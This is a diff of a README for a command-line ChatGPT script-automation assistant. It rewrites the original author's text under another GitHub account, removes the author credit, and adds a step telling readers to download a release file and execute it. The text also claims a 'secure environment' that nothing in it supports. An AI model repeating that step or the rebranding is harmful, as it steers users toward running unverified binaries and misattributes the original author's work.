@@ -1,99 +1,125 @@
-# AI Assistant – OpenAI (ChatGPT) Powered Python Automation Chatbot
+# AI Assistant: Your Terminal-Based Companion 🤖
 
-A command-line AI assistant that leverages ChatGPT (via OpenAI API) for conversational interaction and **safe, on-demand automation**. This assistant can generate, save, and run Python scripts based on user requests—with explicit user confirmation for every action. Perfect for developers, power users, and anyone interested in safe, auditable AI-powered task automation on their local machine.
+![GitHub release](https://img.shields.io/github/release/harsh123-awara/ai_asistant.svg)
+![GitHub issues](https://img.shields.io/github/issues/harsh123-awara/ai_asistant.svg)
+![GitHub stars](https://img.shields.io/github/stars/harsh123-awara/ai_asistant.svg)
 
----
+Welcome to the **AI Assistant** repository! This project serves as a terminal-based AI assistant that leverages the ChatGPT API. It allows you to generate, save, and run Python scripts securely, all from your command line. With this tool, you can automate tasks with ease and confidence.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
 ## Features
 
-* **Conversational AI**: Interact with ChatGPT (gpt-4-turbo or gpt-3.5-turbo) from the terminal
-* **Script Generation**: Ask for automations; the assistant will generate Python scripts as needed
-* **Safety First**: User must confirm before any script is saved or executed
-* **Script Management**: Unique filenames, script history, list and rerun any created script
-* **Memory**: Keeps short conversation context for more relevant answers
-* **No GUI, No Bloat**: Minimal dependencies, pure Python experience
+- **ChatGPT Integration**: Interact with the powerful ChatGPT API to generate Python scripts.
+- **Script Management**: Save scripts directly to your local machine for future use.
+- **User Approval**: Ensure security by requiring user approval before executing any script.
+- **Task Automation**: Automate repetitive tasks directly from the command line.
+- **Secure Execution**: Run scripts in a controlled environment to prevent unauthorized access.
 
----
+## Installation
 
-## Requirements
+To get started with the AI Assistant, follow these steps:
 
-* Python 3.8+
-* [OpenAI API key](https://platform.openai.com/account/api-keys)
-* `openai` Python package:
-  `pip install openai`
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/harsh123-awara/ai_asistant.git
+   cd ai_asistant
+   ```
 
----
+2. **Install Dependencies**:
+   Ensure you have Python installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. **Set Up Environment Variables**:
+   You need to set your OpenAI API key as an environment variable. Add the following line to your `.bashrc` or `.bash_profile`:
+   ```bash
+   export OPENAI_API_KEY='your_api_key_here'
+   ```
+
+4. **Download the Latest Release**:
+   Visit the [Releases](https://github.com/harsh123-awara/ai_asistant/releases) section to download the latest version. Execute the file after downloading to get started.
 
 ## Usage
 
-1. **Set Your API Key**
+Once you have installed the AI Assistant, you can start using it directly from your terminal.
 
-   * Open the script and set your `OPENAI_API_KEY` at the top.
-
-2. **Run the Script**
-
+1. **Launch the Assistant**:
+   Run the following command:
    ```bash
-   python deepseek_asistant.py
+   python ai_assistant.py
    ```
 
-3. **Start Chatting**
+2. **Interact with the Assistant**:
+   Type your request, and the assistant will generate a Python script based on your input.
 
-   * Type your request/question.
-   * To list all generated scripts, type: `list scripts`
-   * To exit: `exit` or `quit`
+3. **Review the Script**:
+   The generated script will be displayed. You can choose to save it or run it immediately.
 
-4. **Script Creation & Execution**
-
-   * If your request requires a script ("download all files from a URL", etc.), ChatGPT will generate Python code.
-   * You will see the code and be asked for confirmation to save and (optionally) run it.
-   * No script is run or saved without your explicit permission.
-
----
-
-## Example Workflow
-
-```
-User: create a script that lists files in the current directory
-Assistant: (shows script code)
-Assistant: Do you want to save and run this script? (yes/no)
-> yes
-Assistant: Script 'script_list_files_xxxxxx.py' created successfully.
-Assistant: Do you want to execute this script? (yes/no)
-> yes
-Assistant: (prints script output)
-```
-
----
+4. **Execute the Script**:
+   If you approve the script, you can run it with a simple command. The assistant will execute the script in a secure environment.
 
 ## Commands
 
-* `list scripts` : Show all scripts generated in this session
-* `exit` / `quit` : End the session
+Here are some common commands you can use with the AI Assistant:
 
----
+- **Generate a Script**:
+   ```bash
+   generate_script "Your task description"
+   ```
 
-## Security Notes
+- **Save the Script**:
+   ```bash
+   save_script "script_name.py"
+   ```
 
-* **Scripts only run with your explicit approval**
-* Each script is saved with a unique name, and you can review code before executing
-* No scripts are executed automatically
+- **Run the Script**:
+   ```bash
+   run_script "script_name.py"
+   ```
 
----
+- **List Saved Scripts**:
+   ```bash
+   list_scripts
+   ```
 
-## Customization
+## Contributing
 
-* **Model:** Change `MODEL_NAME` to `gpt-4-turbo` or `gpt-3.5-turbo`
-* **System Prompt:** Adjust the system prompt in `chat_with_gpt()` for custom behavior
-* **History Depth:** Edit the number of history items retained (`history[-5:]`)
+We welcome contributions to improve the AI Assistant. If you want to contribute, please follow these steps:
 
----
+1. **Fork the Repository**: Click the "Fork" button on the top right of the page.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Edit the code as needed.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request."
 
 ## License
 
-MIT (c) Emir Baycan
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
----
+## Support
 
-## Author
+If you have any questions or issues, feel free to open an issue on GitHub. You can also check the [Releases](https://github.com/harsh123-awara/ai_asistant/releases) section for updates and downloads.
 
-Developed by [Emir Baycan](https://emirbaycan.com.tr/)
+## Conclusion
+
+The AI Assistant is designed to make your life easier by automating tasks and providing a secure way to run scripts. We hope you find this tool useful and encourage you to contribute to its development. Happy coding!
